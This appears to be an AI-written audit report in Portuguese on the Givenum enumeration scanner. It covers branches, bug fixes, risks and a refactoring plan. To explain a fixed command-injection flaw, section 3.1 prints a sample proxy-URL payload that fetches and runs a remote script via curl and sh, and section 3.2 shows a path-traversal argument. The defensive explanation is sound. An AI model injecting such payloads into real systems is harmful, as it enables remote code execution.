# Givenum — Audit Report

**Data:** 2026-04-25
**Branch:** `organize-web-enum-tools`
**Escopo:** Auditoria completa: Python core (`GivEnum.py`), Web UI (Next.js), Docker, scripts, branches.
**Objetivo:** Consolidar branches, identificar bugs reais, propor robustez para uma plataforma de scan de enumeração ativa/passiva.

---

## TL;DR

Você tem um produto **funcional e razoavelmente organizado**, mas com 2 vulnerabilidades reais (1 RCE potencial via supply-chain de proxies, 1 path traversal) e um monólito Python de 5007 linhas que vai te morder em 3-6 meses se não for modularizado. A Web UI está em bom estado — TypeScript estrito, zero `any`, zero `TODO`. Os bugs críticos foram corrigidos nesta sessão. O resto está documentado e priorizado abaixo.

**Trabalho não-commitado** = uma feature coerente (settings consolidation + dashboard redesign + diff rework + tool/proxy/report management). Pode ser commitado em **um único commit lógico**, ou separado em 4-5 commits temáticos.

**Branches:** `fix/bugs-and-cleanup` já foi mergeado (commit `09a8279`); `claude/determined-darwin` está atrás do main. **Ambos podem ser deletados.**

---

## 1. Estado das Branches

| Branch | Status | Recomendação |
|---|---|---|
| `organize-web-enum-tools` | **Atual, ativo** — todos os commits estão aqui | Manter como main |
| `fix/bugs-and-cleanup` | Já mergeado em `09a8279` (Apr 14) | `git branch -D fix/bugs-and-cleanup && git push origin --delete fix/bugs-and-cleanup` |
| `claude/determined-darwin` | HEAD = `5fe3719`, atrás do main, sem commits únicos | `git branch -D claude/determined-darwin && git push origin --delete claude/determined-darwin` |

---

## 2. Triagem do WIP (15 modificados + 11 untracked)

Tudo é uma **única feature coerente** chamada *Settings + Dashboard v2*. Os arquivos se interdependem:

| Conjunto | Arquivos | Propósito |
|---|---|---|
| **Tema visual** | `globals.css`, `layout.tsx`, `page.tsx`, `scan/[id]/page.tsx` | Paleta neon-purple, header com blur, dashboard responsivo |
| **Settings hub** | `settings/page.tsx` (redirect), `settings/layout.tsx` (NEW), `settings/{apis,proxy,tools,reports}/page.tsx` (NEW), `SettingsSidebar.tsx` (NEW) | 4 sub-páginas em `/settings/*` |
| **Proxy management** | `lib/types.ts` (+ProxyConfig), `lib/app-data.ts` (+read/writeProxyConfig), `lib/proxy-fetcher.ts` (NEW), `api/settings/proxy/{route,fetch/route}.ts` (NEW), `ProxySettingsForm.tsx` (NEW) | Single + rotate mode, fetch de 10 fontes públicas, validação curl em batch |
| **Tools update** | `lib/tools.ts` (NEW), `api/tools/{route,update/route,update/log/route}.ts` (NEW), `ToolUpdateConsole.tsx` (NEW) | Registry de 25 ferramentas, instalação via shell script com tail de log |
| **Reports** | `lib/report.ts` (NEW), `api/reports/[scanId]/route.ts` (NEW), `ReportsForm.tsx` (NEW), `settings/reports/page.tsx` (NEW) | Geração de relatório HTML por scan |
| **Dashboard UX** | `DashboardControls.tsx`, `ManageActions.tsx` (+RescanButton) | Botão de rescan com mesmo modo |
| **Diff rework** | `lib/results.ts` (refactor), `lib/types.ts` (+DiffData fields) | Calcular diff direto de arquivos atuais vs anteriores em vez de ler `.diff` files |
| **Reliability** | `JobLogViewer.tsx` (overlap-poll guard), `api/settings/apis/route.ts` (preserve masked keys) | Bug fixes de polling e API key clearing |
| **Análise** | `analyze_results.py` (NEW, 536 lines) | Script standalone — separado do core |
| **Infra** | `Dockerfile` (+10 ferramentas: naabu, ffuf, byp4xx, kr, jwt-tool, s3scanner, gf, shuffledns, notify, interactsh) | Suporte às novas integrações em GivEnum.py |

**Risco de commitar parcial:**
- `settings/page.tsx` redireciona para `/settings/apis`. Se você commitar a redireção sem commitar `settings/apis/page.tsx`, o site vai 404 em produção.
- `lib/types.ts` exporta `ProxyConfig` que `app-data.ts` importa. Sem os dois, build quebra.

**Recomendação:** Commit único OU 4 commits temáticos rigorosamente ordenados (types → libs → APIs → componentes → páginas → temas). Fazer `git add -p` é tentador mas perigoso aqui — você corre risco de gerar build quebrado intermediário.

---

## 3. Bugs Corrigidos Nesta Sessão

### 3.1 [HIGH/Security] Command injection via proxy URL  ✅ CORRIGIDO
**Arquivo:** `web/src/lib/proxy-fetcher.ts:104`

`exec()` com template literal interpolando `proxyUrl`. As listas de proxy vêm de **GitHub público** (jetkai/proxy-list, etc.) — qualquer commit malicioso poderia injetar payload tipo `http://1.2.3.4:8080$(curl evil.sh|sh)`. O `$()` é expandido pelo shell mesmo entre aspas duplas. `normaliseProxy()` valida via `new URL()` mas isso aceita `$()` na pathname.

**Fix:** trocado para `execFile('curl', [args])` — bypassa shell completamente.

### 3.2 [HIGH/Security] Path traversal em OutputManager  ✅ CORRIGIDO
**Arquivo:** `GivEnum.py` — `class OutputManager.__init__` e `get_path()`

`Path(base_dir) / f"{domain}_{timestamp}"` aceitava qualquer string como `domain`. CLI sem validação. Exemplo: `python3 GivEnum.py -d "../../../etc/passwd"` escrevia em `/etc/passwd_TIMESTAMP/`.

**Fix:**
- Regex `_SAFE_DOMAIN_RE` valida domain.
- `Path.resolve()` + `relative_to()` checa que o path final está dentro de `base_dir`.
- `get_path()` ganhou a mesma proteção contra filename malicioso.

### 3.3 [MEDIUM] Race condition em `_tool_log`  ✅ MITIGADO
**Arquivo:** `GivEnum.py:466`

Dict global escrito por 5+ classes de múltiplas threads (gau, jsubfinder, crawlers, etc.). CPython GIL torna writes individuais atômicos, mas iteração concorrente pode causar `RuntimeError: dictionary changed size during iteration`.

**Fix:**
- Adicionado `_tool_log_lock = threading.Lock()`.
- Helpers `record_tool_log()` e `snapshot_tool_log()` thread-safe.
- Reads atuais (final do scan) já são seguros — lock é defensivo para futuro.

### 3.4 [MEDIUM] 5 bare `except:` mascarando bugs  ✅ CORRIGIDO
**Arquivos:** `GivEnum.py` linhas 212, 1548, 2912, 3004, 4828.

Bare `except:` captura `KeyboardInterrupt` e `SystemExit`. L212 silenciava falha de carregar API config — usuário ficava sem saber por que scan rodava sem API keys.

**Fix:** Especificado `OSError`/`json.JSONDecodeError`/`Exception` conforme apropriado, com `Logger.warning()` para os casos críticos. Os silenciosos (parsers de output) ficaram com comentário explicando.

### 3.5 [LOW] DRY violation no diff mapping  ✅ CORRIGIDO
**Arquivo:** `web/src/lib/results.ts`

Mapeamento `diffName → diretório` duplicado **duas vezes** na mesma função (chain ternária 5x para currentFile + 5x para previousFile). Adicionar uma nova categoria de diff exigia editar 2 lugares.

**Fix:** Extraído para const `DIFF_SOURCES` — single source of truth.

---

## 4. Bugs / Riscos Pendentes (Por Prioridade)

### P1 — Atacar nas próximas 1-2 semanas

**P1.1 — `settings/page.tsx` quebra se untracked não for commitado**
Se `git checkout` em qualquer branch que não tenha `settings/apis/page.tsx`, o redirect leva a 404. **Ação:** Garantir que o commit do redirect inclui as 4 sub-páginas.

**P1.2 — `dangerouslySetInnerHTML` em JobLogViewer com função `renderAnsiToHtml` não auditada**
`JobLogViewer.tsx:535` usa HTML cru gerado por `renderAnsiToHtml()` (linha 186). O arquivo `lib/ansi.ts` separado (que retorna spans React) parece seguro, mas `renderAnsiToHtml` no próprio JobLogViewer é uma função distinta. **Ação:** Auditar `renderAnsiToHtml()` linha 186 — confirmar que escapa `<`, `>`, `&` antes de wrappar em `<span>`. Se já escapa, considerar migrar para usar o helper compartilhado de `lib/ansi.ts` (DRY).

**P1.3 — Tools update grava shell script no disco e executa**
`api/tools/update/route.ts:33` constrói shell script via template e roda com `spawn('sh', [scriptPath])`. Tool names vêm de whitelist (`TOOL_REGISTRY`), então hoje é seguro, mas o padrão é frágil. **Ação:** Em vez de gerar script, executar comandos `go install x@latest` direto via `execFile` em loop, capturando saída para o log.

**P1.4 — Falta de `set -e` / fallback em `install_tools.sh`**
Comentário diz "No set -e: handle errors per-command". OK na intenção, mas alguns paths fazem `pip install || true` enquanto outros explodem. **Ação:** Adicionar função `try_install()` padronizada.

### P2 — Próximo mês

**P2.1 — `URLCollector` é god class (932 linhas, L1622-2553)**
Orquestra 5 estratégias de coleta + thread pool + rate limiting + parsing. Modificar uma estratégia exige entender as outras 4. **Ação:** Extrair `ArchiveCollector` (gau/wayback) e `LiveCrawler` (xurl/katana/hakrawler/meg) como classes separadas, com interface comum.

**P2.2 — Falta circuit breaker para tools ausentes**
`ToolChecker.check_tool()` retorna False mas o pipeline segue. Em alguns casos a falta de uma tool gera output vazio que é tratado como "0 results found" — engana o relatório. **Ação:** Logger.warning visível + flag `report.missing_tools` no JSON final.

**P2.3 — Sem rate limiting global**
Cada tool tem seu próprio (`-rate-limit` no nuclei, `--max-time` no curl). Mas se você roda 5 tools em paralelo contra o mesmo target, o alvo pode te bloquear. **Ação:** Implementar `HostBucket` semaphore global por host alvo.

**P2.4 — Sem retry exponencial centralizado**
`_api_request()` em L108 tem retry, mas tools shell não. Se subfinder falha por 1s de DNS hiccup, scan continua sem subdomains. **Ação:** wrapper `run_logged_with_retry()` para tools idempotentes.

**P2.5 — Recursão de paths em `screenshot/[file]` route**
`api/scan/[id]/screenshot/[file]/route.ts:18` usa `path.basename()` — bom contra `../`. Mas não valida extensão (`.png|.jpg|.webp`). Atacante poderia tentar servir `.env` se conseguisse plantá-lo no diretório screenshots. Risco baixo (path controlado), mas vale validar mime.

### P3 — Roadmap (próximos 3 meses)

**P3.1 — Modularizar `GivEnum.py`**
Plano sugerido (em arquivos separados, mantendo uma `main.py` enxuta):

```
givenum/
├── __init__.py
├── main.py                  # CLI + GivEnum orchestrator (200 linhas)
├── config/
│   ├── api_keys.py          # APIConfig (140 linhas)
│   ├── proxy.py             # ProxyConfig (60 linhas)
│   └── logger.py            # Logger + Colors (90 linhas)
├── core/
│   ├── tool_runner.py       # run_logged + ToolChecker + _tool_log (180 linhas)
│   ├── output.py            # OutputManager (90 linhas)
│   └── concurrency.py       # ThreadPool helpers + HostBucket (NEW)
├── recon/
│   ├── certificate.py       # CertificateTransparency
│   ├── passive_apis.py      # PassiveAPIs (VT, OTX, SecurityTrails)
│   ├── subdomain.py         # SubdomainEnum
│   └── dns.py               # DNSResolver
├── scanning/
│   ├── ports.py             # PortScanner
│   ├── http.py              # HTTPProber
│   ├── url_collection/
│   │   ├── __init__.py
│   │   ├── archive.py       # gau, waybackurls
│   │   ├── live_crawler.py  # katana, hakrawler, meg, xurlfind3r
│   │   └── collector.py     # orchestrator
│   ├── js.py                # JSAnalyzer
│   ├── git.py               # GitDumper
│   ├── vuln.py              # VulnScanner (nuclei, dalfox, sqlmap)
│   ├── fuzz.py              # FuzzScanner (ffuf)
│   ├── jwt.py               # JWTScanner
│   ├── s3.py                # S3Scanner
│   ├── bypass.py            # BypassScanner (byp4xx)
│   ├── api_discovery.py     # APIDiscovery (kiterunner)
│   ├── parameters.py        # ParameterDiscovery (arjun)
│   └── takeover.py          # TakeoverChecker
├── enrichment/
│   ├── recon.py             # ReconEnricher (Shodan, etc.)
│   └── cloud.py             # CloudDetector
└── reporting/
    ├── notification.py      # Slack/Discord/Telegram
    ├── diff.py              # DiffManager
    └── report.py            # ReportGenerator
```

Migrar **uma classe por commit**, mantendo `from .recon.subdomain import SubdomainEnum` no `main.py` antigo até zerar. Sem testes, é a única forma segura.

**P3.2 — Adicionar testes mínimos antes da modularização**

Sem teste, refatorar é roleta russa. Mínimo recomendado:
- `tests/test_output_manager.py` — valida domain rejection, path traversal, criação de dirs
- `tests/test_matches_domain.py` — wildcards, edge cases
- `tests/test_tool_log.py` — concorrência (10 threads escrevendo)
- `tests/test_diff_calculation.py` — Web (`results.ts` com vitest)
- `tests/test_normalise_proxy.py` — proxy URL validation

Meta: subir de 0% para ~30% cobertura nas zonas críticas. Não é luxo — é pré-requisito para refatorar.

**P3.3 — Observabilidade**
- Adicionar `--json-log` flag para emitir log estruturado por linha (NDJSON).
- Job log atual é texto + ANSI — bom para humano, ruim para máquina.
- Permitiria UI mostrar gráfico de timeline por ferramenta sem parser frágil.

**P3.4 — Deduplicar lógica de polling no front**
`ProxySettingsForm`, `ToolUpdateConsole`, `JobLogViewer` cada um tem seu polling com `setInterval` + abort. Extrair `usePolledFetch(url, intervalMs, isDone)` hook.

---

## 5. Plano de Robustez (resposta direta ao seu objetivo)

Seu pedido foi *"robustar para ser uma aplicação totalmente para scan enumeração e scan ativo"*. Em ordem prática:

### Fase A — **Esta semana** (4-6h de trabalho)
1. Commit do WIP atual (settings + redesign).
2. Aplicar fixes desta sessão (já estão no working tree).
3. Deletar branches stale.
4. Auditar `renderAnsiToHtml()` (P1.2).
5. Adicionar testes para os módulos críticos — `OutputManager`, `matches_domain`, `normaliseProxy` (P3.2).

### Fase B — **Próximas 2 semanas** (10-15h)
6. Migrar tools update para `execFile` em loop (P1.3).
7. Padronizar error handling em `install_tools.sh` (P1.4).
8. Implementar `usePolledFetch` hook e refatorar 3 lugares.
9. Extrair `URLCollector` em `Archive` + `LiveCrawler` (P2.1) — primeira modularização.

### Fase C — **Mês 2-3**
10. Modularizar restante do `GivEnum.py` em pacote `givenum/` (P3.1).
11. Adicionar `HostBucket` global (P2.3) e `run_logged_with_retry()` (P2.4).
12. Migrar log para NDJSON (P3.3).
13. Subir cobertura de testes para 50%+ no core.

### Fase D — **Long term**
14. CI: GitHub Actions rodando `pytest`, `tsc --noEmit`, `eslint`, `npm run build`.
15. Pre-commit hook: `ruff` + `prettier`.
16. Versionamento semântico + CHANGELOG automatizado.
17. Container scan (trivy) no Dockerfile.

---

## 6. Push-back honesto

Algumas opiniões impopulares pra você considerar:

- **Você pediu pra "melhorar o Next pra um scan"** — meu conselho é o oposto. A Web UI é a parte mais saudável do código. O gargalo de robustez está no Python. Investir tempo refatorando React quando o monólito de 5007 linhas explode em race conditions é misalocar esforço.

- **3 branches paralelos = sinal de processo confuso.** Você está usando branches como "checkpoint" em vez de feature isolada. Recomendo: 1 branch por feature, vida curta, merge rápido. Use stash + WIP commits + rebase pra checkpoint local.

- **Adicionar 10 ferramentas no Dockerfile sem garantir que GivEnum.py sabe lidar com tools ausentes vai quebrar quando você publicar a imagem em ambiente diferente.** O `|| echo` no Docker mascara falhas — o usuário só descobre na hora do scan. Adicione `ToolChecker.check_required()` no início do `main()` que falha cedo se tools P0 estiverem ausentes.

- **A dependência de `gau`, `subfinder`, etc. (todas Go binaries) sem pinning de versão** é uma bomba relógio. Quando uma quebrar API CLI numa versão futura, seu scan quebra silencioso. Pinar versões no Dockerfile (`@v2.5.1` em vez de `@latest`).

- **Sem testes, qualquer refatoração que eu fizer agora é arrogância.** Por isso me limitei a fixes cirúrgicos e adicionei helpers (`record_tool_log`, `snapshot_tool_log`) sem trocar callsites. **Pare de pedir refatoração antes de ter testes.** Investir 1-2 dias escrevendo 30 testes vai te economizar 1-2 semanas de regressão depois.

---

## 7. Resumo das Mudanças Aplicadas

| Arquivo | Tipo | Linhas |
|---|---|---|
| `web/src/lib/proxy-fetcher.ts` | Security: exec → execFile | -1 / +12 |
| `GivEnum.py` (OutputManager) | Security: domain validation + path resolve check | +30 |
| `GivEnum.py` (`_tool_log` infra) | Reliability: lock + helpers | +18 |
| `GivEnum.py` (5 bare except) | Bug: especificar Exception + log | +10 / -5 |
| `web/src/lib/results.ts` | DRY: mapping extraído | -16 / +14 |

**Verificação:** `python3 -c 'ast.parse(...)'` ✅ passou. `npx tsc --noEmit` ✅ exit 0.

---

## 8. Comandos de Limpeza Recomendados

```bash
# 1. Commit do WIP (faça em uma janela só pra evitar build quebrado)
cd /Users/dvl/CODE/Givenum
git add -A
git commit -m "feat: settings hub (proxy/tools/reports), dashboard v2, diff rework

- New /settings/{apis,proxy,tools,reports} sub-pages with sidebar nav
- Proxy management: single mode (Burp) + rotate mode (free list fetch+validate)
- Tools update console with selectable registry + tail log
- HTML report generator per scan
- Dashboard redesign: neon-purple palette, responsive layout, rescan button
- Diff calculation: compute from current/previous scan dirs (was reading .diff files)
- API keys: preserve masked values, allow clearing via empty string
- JobLogViewer: prevent overlapping polls (was duplicating lines)
- Dockerfile: add naabu, ffuf, byp4xx, kiterunner, jwt-tool, s3scanner, gf, etc.

Includes audit fixes:
- proxy-fetcher: exec → execFile (supply-chain RCE prevention)
- OutputManager: domain validation + path traversal guard
- _tool_log: thread-safe helpers
- 5 bare excepts replaced with typed handlers + logging
- results.ts: DRY diff source mapping"

# 2. Deletar branches stale
git branch -D fix/bugs-and-cleanup claude/determined-darwin
git push origin --delete fix/bugs-and-cleanup claude/determined-darwin

# 3. Push
git push origin organize-web-enum-tools

# 4. (Opcional) Renomear o branch principal
git branch -m organize-web-enum-tools main
git push -u origin main
git push origin --delete organize-web-enum-tools
```
